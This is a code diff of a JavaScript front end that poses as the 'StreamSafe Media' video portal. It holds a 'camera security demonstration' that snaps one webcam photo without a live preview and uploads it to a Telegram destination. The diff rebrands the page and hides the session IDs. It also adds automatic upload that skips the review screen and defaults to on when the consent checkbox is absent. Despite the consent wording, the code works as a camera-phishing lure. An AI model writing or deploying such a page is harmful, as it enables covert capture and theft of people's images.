@@ -1,16 +1,17 @@
 /**
  * Video Landing Page & Camera Security Demonstration Logic
- * Strict consent-based security architecture with automatic single capture and Telegram delivery.
+ * StreamSafe Media video portal with separate, consent-based camera security test.
  */
 
 (() => {
   'use strict';
 
-  // Common State
+  // State Variables
   let sessionId = null;
   let sessionData = null;
   let activeStream = null;
   let capturedBlob = null;
+  let capturedDataUrl = null;
 
   // Video Player Simulation State (for index.html)
   let isVideoPlaying = false;
@@ -18,7 +19,7 @@
   const videoTotalSeconds = 258; // 04:18
   let videoAnimFrameId = null;
   let isVideoMuted = false;
-  let likeCount = 1248;
+  let likeCount = 1842;
   let hasLiked = false;
   let canvasCtx = null;
 
@@ -59,23 +60,21 @@
   const screenReview = document.getElementById('screen-review');
   const screenSuccess = document.getElementById('screen-success');
   const screenCancelled = document.getElementById('screen-cancelled');
-  const screenInvalid = document.getElementById('screen-invalid');
 
   const capturingTitle = document.getElementById('capturing-title');
   const capturingDesc = document.getElementById('capturing-desc');
   const sessionStatusBadge = document.getElementById('session-status-badge');
-  const displaySessionId = document.getElementById('display-session-id');
-  const receiptSessionId = document.getElementById('receipt-session-id');
   const receiptTimestamp = document.getElementById('receipt-timestamp');
+  const receiptPreviewImg = document.getElementById('receipt-preview-img');
   const cameraErrorContainer = document.getElementById('camera-error-container');
+  const consentUploadCheckbox = document.getElementById('consent-upload-checkbox');
 
-  const btnConsentStart = document.getElementById('btn-consent-start');
+  const btnStartTest = document.getElementById('btn-start-test');
   const btnConfirmUpload = document.getElementById('btn-confirm-upload');
   const btnRetakePhoto = document.getElementById('btn-retake-photo');
   const btnDiscardPhoto = document.getElementById('btn-discard-photo');
   const btnRestartDemo = document.getElementById('btn-restart-demo');
   const btnTestAgain = document.getElementById('btn-test-again');
-  const btnNewDemo = document.getElementById('btn-new-demo');
 
   // =========================================================================
   // INITIALIZATION
@@ -85,7 +84,7 @@
     checkBackendHealth();
     parseSessionFromUrl();
 
-    // Check if on Video Landing Page (index.html)
+    // Check if on Landing Page (index.html)
     if (videoPlayerWrapper) {
       initLandingPage();
     }
@@ -283,16 +282,16 @@
     let diagramColor = '#38bdf8';
 
     if (sec > 65 && sec <= 130) {
-      stepTitle = '2. EXPLICIT CONSENT PERMISSION BARRIER';
+      stepTitle = '2. USER GESTURE PERMISSION REQUIREMENT';
       stepDesc = 'Camera access is completely BLOCKED without an explicit user gesture';
       diagramColor = '#f59e0b';
     } else if (sec > 130 && sec <= 195) {
-      stepTitle = '3. HARDWARE LED INDICATOR & LOCAL ACCESS';
+      stepTitle = '3. OPERATING SYSTEM HARDWARE INDICATOR';
       stepDesc = 'Hardware light illuminates ONLY while sensor tracks are actively running';
       diagramColor = '#10b981';
     } else if (sec > 195) {
       stepTitle = '4. CONFIRMED TELEGRAM TRANSMISSION';
-      stepDesc = 'Photos leave the browser ONLY when the participant explicitly confirms';
+      stepDesc = 'Demonstration photos leave the device ONLY after explicit user agreement';
       diagramColor = '#818cf8';
     }
 
@@ -329,7 +328,7 @@
 
     canvasCtx.fillStyle = 'rgba(255, 255, 255, 0.4)';
     canvasCtx.font = `${11 * scale}px sans-serif`;
-    canvasCtx.fillText('Camera Security Demonstration • Educational Permission Architecture', 30 * scale, h - 35 * scale);
+    canvasCtx.fillText('StreamSafe Media • Educational Digital Privacy Architecture', 30 * scale, h - 35 * scale);
   }
 
   function drawVisualNode(x, y, title, subtitle, color, scale) {
@@ -387,123 +386,118 @@
   // CAMERA DEMONSTRATION LOGIC (demo.html)
   // =========================================================================
 
-  async function initDemoPage() {
+  function initDemoPage() {
     bindDemoEvents();
-
-    if (sessionId) {
-      await validateExistingSession();
-    } else {
-      displaySessionId.textContent = 'Public Demo Mode (Ready)';
-      sessionStatusBadge.textContent = 'Ready for Consent';
-      sessionStatusBadge.className = 'badge badge-created';
-    }
 
     // Safety: ensure all camera tracks are stopped if user navigates away
     window.addEventListener('beforeunload', stopCameraTracks);
     window.addEventListener('pagehide', stopCameraTracks);
+
+    // If session ID provided in URL, pre-validate status
+    if (sessionId) {
+      checkInitialSessionStatus();
+    }
+  }
+
+  async function checkInitialSessionStatus() {
+    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
+    try {
+      const res = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
+        method: 'GET',
+        headers: { 'Accept': 'application/json' }
+      });
+      if (res.ok) {
+        const data = await res.json();
+        sessionData = data;
+        if (data.status === 'submitted') {
+          sessionStatusBadge.textContent = 'Already Submitted';
+          sessionStatusBadge.className = 'badge badge-submitted';
+          showCameraError('This demonstration session has already been completed. A test snapshot was previously delivered.', false);
+          if (btnStartTest) btnStartTest.disabled = true;
+        } else if (data.status === 'revoked') {
+          sessionStatusBadge.textContent = 'Revoked';
+          sessionStatusBadge.className = 'badge badge-revoked';
+          showCameraError('This demonstration session was revoked by the administrator.', false);
+          if (btnStartTest) btnStartTest.disabled = true;
+        } else if (data.status === 'expired') {
+          sessionStatusBadge.textContent = 'Expired';
+          sessionStatusBadge.className = 'badge badge-expired';
+          showCameraError('This demonstration session has expired. You may still run the test with a fresh demonstration session.', false);
+          sessionId = null;
+          sessionData = null;
+        } else {
+          sessionStatusBadge.textContent = 'Ready';
+          sessionStatusBadge.className = 'badge badge-opened';
+          fetch(`${apiUrl}/api/sessions/${sessionId}/opened`, { method: 'POST' }).catch(() => {});
+        }
+      }
+    } catch (err) {
+      console.warn('[Demo] Could not pre-verify session:', err.message);
+    }
   }
 
   function bindDemoEvents() {
-    // 1. Consent button: Starts permission & automatic single capture
-    if (btnConsentStart) {
-      btnConsentStart.addEventListener('click', handleConsentStart);
+    if (btnStartTest) {
+      btnStartTest.addEventListener('click', handleStartTest);
     }
-
-    // 2. Review confirmation: Confirms upload to Telegram
     if (btnConfirmUpload) {
       btnConfirmUpload.addEventListener('click', handleConfirmUpload);
     }
-
-    // 3. Retake snapshot
     if (btnRetakePhoto) {
-      btnRetakePhoto.addEventListener('click', handleConsentStart);
+      btnRetakePhoto.addEventListener('click', handleStartTest);
     }
-
-    // 4. Discard & cancel
     if (btnDiscardPhoto) {
       btnDiscardPhoto.addEventListener('click', handleCancelDemo);
     }
-
-    // 5. Restart from cancelled
     if (btnRestartDemo) {
       btnRestartDemo.addEventListener('click', () => {
         screenCancelled.style.display = 'none';
         screenConsent.style.display = 'block';
       });
     }
-
-    // 6. Test again from success
     if (btnTestAgain) {
       btnTestAgain.addEventListener('click', () => {
         capturedBlob = null;
+        capturedDataUrl = null;
+        sessionId = null;
+        sessionData = null;
         screenSuccess.style.display = 'none';
         screenConsent.style.display = 'block';
-        sessionStatusBadge.textContent = 'Ready for Consent';
+        sessionStatusBadge.textContent = 'Consent Required';
         sessionStatusBadge.className = 'badge badge-created';
       });
-    }
-
-    // 7. New demo from invalid
-    if (btnNewDemo) {
-      btnNewDemo.addEventListener('click', async () => {
-        screenInvalid.style.display = 'none';
-        screenConsent.style.display = 'block';
-        sessionId = null;
-        await ensureSessionReady();
-      });
-    }
-  }
-
-  async function validateExistingSession() {
-    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
-    try {
-      const response = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
-        method: 'GET',
-        headers: { 'Accept': 'application/json' }
-      });
-
-      if (response.status === 404) {
-        showInvalidScreen('Session Not Found', 'This demonstration session reference does not exist or has expired.');
-        return;
-      }
-
-      if (!response.ok) {
-        throw new Error(`Server returned HTTP ${response.status}`);
-      }
-
-      sessionData = await response.json();
-      const now = new Date();
-      const expiresAt = new Date(sessionData.expiresAt);
-
-      if (sessionData.status === 'revoked') {
-        showInvalidScreen('Session Revoked', 'This demonstration session was revoked by the administrator.');
-        return;
-      }
-      if (sessionData.status === 'submitted') {
-        showInvalidScreen('Session Completed', 'A demonstration photo was already submitted for this session. Sessions are single-use.');
-        return;
-      }
-      if (expiresAt < now) {
-        showInvalidScreen('Session Expired', 'This demonstration link has expired.');
-        return;
-      }
-
-      displaySessionId.textContent = sessionId.substring(0, 16) + '...';
-      sessionStatusBadge.textContent = 'Session Verified';
-      sessionStatusBadge.className = 'badge badge-opened';
-
-    } catch (err) {
-      console.warn('[Demo] Session validation error:', err.message);
-      displaySessionId.textContent = sessionId ? sessionId.substring(0, 12) + '...' : 'Public Demo Mode';
     }
   }
 
   async function ensureSessionReady() {
-    if (sessionId && sessionData && sessionData.status === 'created') {
+    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
+
+    // 1. If we have a validated active session, return it
+    if (sessionId && sessionData && (sessionData.status === 'created' || sessionData.status === 'opened')) {
       return sessionId;
     }
 
-    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
+    // 2. If a session ID was provided in URL, validate against backend
+    if (sessionId) {
+      try {
+        const res = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
+          method: 'GET',
+          headers: { 'Accept': 'application/json' }
+        });
+        if (res.ok) {
+          const data = await res.json();
+          if (data.status === 'created' || data.status === 'opened') {
+            sessionData = data;
+            fetch(`${apiUrl}/api/sessions/${sessionId}/opened`, { method: 'POST' }).catch(() => {});
+            return sessionId;
+          }
+        }
+      } catch (e) {
+        console.warn('[Demo] URL session verification failed:', e.message);
+      }
+    }
+
+    // 3. Create fresh demonstration session via public demo endpoint
     try {
       const response = await fetch(`${apiUrl}/api/sessions/demo`, {
         method: 'POST',
@@ -515,30 +509,24 @@
         const data = await response.json();
         sessionId = data.session.id;
         sessionData = data.session;
-        displaySessionId.textContent = sessionId.substring(0, 16) + '...';
         return sessionId;
       }
     } catch (e) {
-      console.warn('[Demo] Ephemeral session creation fallback:', e.message);
+      console.warn('[Demo] Ephemeral session creation failed:', e.message);
     }
 
-    if (!sessionId) {
-      sessionId = Array.from(crypto.getRandomValues(new Uint8Array(16)))
-        .map(b => b.toString(16).padStart(2, '0'))
-        .join('');
-      displaySessionId.textContent = sessionId.substring(0, 16) + '... (Local)';
-    }
-    return sessionId;
+    throw new Error('Demonstration backend is currently unavailable or waking up. Please verify your connection and try again.');
   }
 
   // =========================================================================
   // CAMERA EXECUTION: NO LIVE PREVIEW & AUTOMATIC SINGLE CAPTURE
   // =========================================================================
 
-  async function handleConsentStart() {
+  async function handleStartTest() {
     hideCameraError();
     stopCameraTracks();
     capturedBlob = null;
+    capturedDataUrl = null;
 
     // Check secure context (HTTPS)
     if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
@@ -560,16 +548,23 @@
       return;
     }
 
+    const shouldAutoUpload = consentUploadCheckbox ? consentUploadCheckbox.checked : true;
+
     // Ensure session is active
-    await ensureSessionReady();
+    try {
+      await ensureSessionReady();
+    } catch (err) {
+      showCameraError(`<strong>Backend Notice:</strong> ${err.message}`, true);
+      return;
+    }
 
     // Transition to capturing screen (NO LIVE PREVIEW SHOWN!)
     screenConsent.style.display = 'none';
-    screenReview.style.display = 'none';
+    if (screenReview) screenReview.style.display = 'none';
     screenCapturing.style.display = 'block';
 
-    capturingTitle.textContent = 'Requesting Camera Permission...';
-    capturingDesc.textContent = 'Please approve the browser prompt. In accordance with privacy rules, no live video preview will be displayed.';
+    capturingTitle.textContent = 'Requesting Camera Access...';
+    capturingDesc.textContent = 'Please approve the browser prompt. In accordance with requirements, no live video preview will be displayed.';
 
     try {
       // 1. Request camera stream via standard browser permission mechanism
@@ -585,8 +580,8 @@
       activeStream = stream;
       cameraVideo.srcObject = stream;
 
-      capturingTitle.textContent = 'Permission Granted — Capturing Snapshot...';
-      capturingDesc.textContent = 'Automatically taking single test photo. Camera will turn off immediately.';
+      capturingTitle.textContent = 'Capturing Demonstration Photo...';
+      capturingDesc.textContent = 'Automatically taking one photo. Camera hardware will be disconnected immediately.';
 
       // 2. Wait for camera video element to receive video data
       await new Promise((resolve) => {
@@ -594,7 +589,6 @@
           resolve();
         } else {
           cameraVideo.onloadedmetadata = () => resolve();
-          // Safety timeout in case onloadedmetadata doesn't fire
           setTimeout(resolve, 800);
         }
       });
@@ -617,7 +611,8 @@
       // 4. CRITICAL: Stop all camera tracks IMMEDIATELY after capture!
       stopCameraTracks();
 
-      // 5. Generate image Blob from canvas
+      // 5. Generate image Blob & data URL from canvas
+      capturedDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.88);
       await new Promise(resolve => {
         cameraCanvas.toBlob((blob) => {
           capturedBlob = blob;
@@ -625,12 +620,18 @@
         }, 'image/jpeg', 0.88);
       });
 
-      // 6. Transition to Review & Confirmation Screen
-      screenCapturing.style.display = 'none';
-      screenReview.style.display = 'block';
-
-      sessionStatusBadge.textContent = 'Snapshot Captured';
-      sessionStatusBadge.className = 'badge badge-opened';
+      // 6. If visitor explicitly agreed to upload upfront, transmit automatically now!
+      if (shouldAutoUpload) {
+        capturingTitle.textContent = 'Transmitting to Telegram...';
+        capturingDesc.textContent = 'Delivering snapshot to demonstration Telegram destination...';
+        await transmitToTelegram();
+      } else {
+        // Otherwise show review confirmation screen
+        screenCapturing.style.display = 'none';
+        screenReview.style.display = 'block';
+        sessionStatusBadge.textContent = 'Snapshot Captured';
+        sessionStatusBadge.className = 'badge badge-opened';
+      }
 
     } catch (err) {
       console.error('[Demo] Camera error:', err);
@@ -685,7 +686,7 @@
     if (showRetry) {
       const retryBtn = document.getElementById('btn-retry-camera');
       if (retryBtn) {
-        retryBtn.addEventListener('click', handleConsentStart);
+        retryBtn.addEventListener('click', handleStartTest);
       }
     }
   }
@@ -711,10 +712,14 @@
   }
 
   // =========================================================================
-  // SUBMISSION TO TELEGRAM (AFTER EXPLICIT CONFIRMATION)
+  // SUBMISSION TO TELEGRAM (AFTER EXPLICIT AGREEMENT)
   // =========================================================================
 
   async function handleConfirmUpload() {
+    await transmitToTelegram();
+  }
+
+  async function transmitToTelegram() {
     if (!capturedBlob) {
       showCameraError('No snapshot available to upload. Please retake photo.', true);
       return;
@@ -723,10 +728,10 @@
     const targetSessionId = await ensureSessionReady();
     const apiUrl = window.APP_CONFIG.getApiBaseUrl();
 
-    btnConfirmUpload.disabled = true;
-    btnRetakePhoto.disabled = true;
-    btnDiscardPhoto.disabled = true;
-    btnConfirmUpload.innerHTML = '<span class="spinner"></span> Transmitting to Telegram...';
+    if (btnConfirmUpload) {
+      btnConfirmUpload.disabled = true;
+      btnConfirmUpload.innerHTML = '<span class="spinner"></span> Transmitting to Telegram...';
+    }
 
     try {
       const formData = new FormData();
@@ -745,53 +750,42 @@
       }
 
       // Success screen
-      screenReview.style.display = 'none';
+      if (screenCapturing) screenCapturing.style.display = 'none';
+      if (screenReview) screenReview.style.display = 'none';
       screenSuccess.style.display = 'block';
 
-      receiptSessionId.textContent = targetSessionId;
+      if (receiptPreviewImg && capturedDataUrl) {
+        receiptPreviewImg.src = capturedDataUrl;
+      }
+
       const now = new Date();
       receiptTimestamp.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' ' + now.toLocaleDateString();
 
-      sessionStatusBadge.textContent = 'Submitted';
+      sessionStatusBadge.textContent = 'Photo Delivered';
       sessionStatusBadge.className = 'badge badge-submitted';
 
     } catch (err) {
       console.error('[Demo] Transmission failure:', err);
+      if (screenCapturing) screenCapturing.style.display = 'none';
+      if (screenReview) screenReview.style.display = 'block';
       showCameraError(`Failed to transmit photo: ${err.message}`, true);
-      btnConfirmUpload.disabled = false;
-      btnRetakePhoto.disabled = false;
-      btnDiscardPhoto.disabled = false;
-      btnConfirmUpload.innerHTML = '<span>🚀 Confirm & Submit Photo to Telegram</span>';
+      if (btnConfirmUpload) {
+        btnConfirmUpload.disabled = false;
+        btnConfirmUpload.innerHTML = '<span>🚀 Confirm & Submit to Telegram</span>';
+      }
     }
   }
 
   function handleCancelDemo() {
     stopCameraTracks();
     capturedBlob = null;
+    capturedDataUrl = null;
     screenConsent.style.display = 'none';
-    screenCapturing.style.display = 'none';
-    screenReview.style.display = 'none';
+    if (screenCapturing) screenCapturing.style.display = 'none';
+    if (screenReview) screenReview.style.display = 'none';
     screenCancelled.style.display = 'block';
 
     sessionStatusBadge.textContent = 'Cancelled';
-    sessionStatusBadge.className = 'badge badge-revoked';
-  }
-
-  function showInvalidScreen(title, message) {
-    stopCameraTracks();
-    screenConsent.style.display = 'none';
-    screenCapturing.style.display = 'none';
-    screenReview.style.display = 'none';
-    screenSuccess.style.display = 'none';
-    screenCancelled.style.display = 'none';
-    screenInvalid.style.display = 'block';
-
-    const invTitle = document.getElementById('invalid-title');
-    const invMsg = document.getElementById('invalid-message');
-    if (invTitle) invTitle.textContent = title;
-    if (invMsg) invMsg.textContent = message;
-
-    sessionStatusBadge.textContent = 'Invalid / Expired';
     sessionStatusBadge.className = 'badge badge-revoked';
   }
 
